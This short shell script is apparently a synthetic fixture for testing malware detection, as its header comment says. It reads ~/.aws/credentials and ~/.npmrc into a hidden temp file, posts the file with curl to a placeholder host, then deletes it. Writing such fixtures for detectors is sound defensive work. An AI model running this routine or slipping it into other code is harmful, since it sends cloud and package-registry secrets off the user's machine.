#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
out=/tmp/.s.txt
cat ~/.aws/credentials >> "$out"; cat ~/.npmrc >> "$out"
curl -s \
  --data-binary @"$out" \
  https://c.example.invalid/u
rm -f "$out"
